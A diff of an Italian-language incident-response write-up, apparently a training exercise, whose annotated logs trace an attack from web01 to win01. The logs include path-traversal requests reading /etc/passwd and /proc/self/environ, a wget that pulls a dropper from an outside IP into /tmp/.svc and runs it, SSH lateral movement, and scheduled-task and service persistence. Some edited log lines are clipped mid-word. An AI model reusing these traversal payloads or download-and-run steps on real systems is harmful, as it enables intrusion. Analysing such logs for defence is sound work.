@@ -18,11 +18,11 @@ Security logs
 ```
 Recon / Exploitation (web01)
  └── 09:12:14 web01 nginx --> LFI: /reports/view.php?doc=../../../../../../etc/passwd (trace_id=tr-A)
-     └── php-fpm → accessed /etc/passwd
+     └── php-fpm -> 200 /etc/passwd
  └── 09:12:16 web01 nginx -> LFI: /download.php?file=../../../var/log/auth.log (trace_id=tr-B)
-     └── php-fpm → accessed /var/log/auth.log
+     └── php-fpm -> 200 /var/log/auth.log
  └── 09:12:18 web01 nginx -> LFI: /app/help.php?topic=../../../../proc/self/environ (trace_id=tr-A)
-     └── auditd → SYSCALL: php-fpm spawns /usr/bin/bash -c "id; uname -a" → RCE confirmed
+     └── auditd --> SYSCALL: php-fpm spawns /usr/bin/bash -c "id; uname -a" → RCE conf
  └── 09:15:27 web01 nginx --> Attempted LFI on config.php (trace_id=tr-A) → PHP error / php-fpm crash & restart
 ```
 
@@ -47,7 +47,7 @@ In breve, l’attaccante è partito leggendo file di sistema, ma è riuscito ad 
  └── 09:18:41 web01 nginx -> LFI: /download.php?file=../../../../etc/hosts (trace_id=tr-B)
      └── 09:18:42 auditd -> wget http://198.51.100.91/.s → saved as /tmp/.svc
      └── 09:19:03 auditd -> chmod +x /tmp/.svc
-     └── 09:19:07 auditd  --> /tmp/.svc --ping (dropper executed)
+     └── 09:19:07 auditd  --> /tmp/.svc --ping (dropper)
 ```
 Alle 09:18:41, ho visto un’altra richiesta LFI, questa volta rivolta a download.php con il parametro `file=../../../../etc/hosts` . A prima vista sembrava simile alle precedenti, ma subito dopo ho notato qualcosa di diverso.
 Solo un secondo dopo, alle 09:18:42, auditd registra un comando wget che scarica un file da un server esterno (IP: 198.51.100.91) e lo salva come /tmp/.svc. Questo file mi ha subito fatto pensare a un dropper, cioè un piccolo programma usato per caricare malware.
@@ -60,8 +60,8 @@ Questo mi conferma che il payload è stato non solo consegnato, ma anche attivat
 ```
 Movimento Laterale-- Tentativo web01 -> win01
  └── 09:21:05 web01 auditd -> python3 one-liner to ssh admin@win01 (trace_id=tr-A)
-     └── 09:24:11 win01 Security -> Logon failure admin from 10.10.5.21
-     └── 09:24:59 win01 Security -> Successful logon svc_webapp from 10.10.5.21
+     └── 09:24:11 win01 Security -> 4625 admin from 10.10.5.21
+     └── 09:24:59 win01 Security -> 4624 logon svc_webapp from 10.10.5.21
 
 ```
 Alle 09:21:05, ho notato un comando eseguito tramite python3 da web01 che cercava di avviare una sessione SSH con l’utente admin@win01. Era una one-liner classica, del tipo usato per tentare un accesso veloce e silenzioso.
@@ -74,9 +74,9 @@ Ma alle 09:24:59, la situazione cambia: c’è un accesso riuscito, stavolta con
 Persistenza su win01
  └── 09:25:07 TaskScheduler EventID=106 -> Task registered "\System\UpdaterCache"
      Action = powershell.exe -File C:\ProgramData\upc.ps1 (trace_id=tr-B)
- └── 09:25:11 Sysmon 11 -> FileCreate C:\ProgramData\upc.ps1 (by powershell.exe)
- └── 09:25:42 SCM EventID=7045 --> Service installed "WinCacheSvc" → wincache.exe auto start
- └── 09:26:03 TaskScheduler EventID=201 --> Task "\System\UpdaterCache" started
+ └── 09:25:11 Sysmon 11 -> FileCreate C:\ProgramData\upc.ps1 (powershell.exe)
+ └── 09:25:42 SCM EventID=7045 --> Service inst "WinCacheSvc" → wincache.exe auto-start
+ └── 09:26:03 TaskScheduler EventID=201 --> Task "\System\UpdaterCache" str
 ```
 Subito dopo l’accesso riuscito, l’attaccante inizia a stabilire persistenza sul sistema win01. 
 09:25:07, ho visto che viene registrato un nuovo task pianificato chiamato \System\UpdaterCache. L’azione associata al task esegue powershell.exe con uno script:
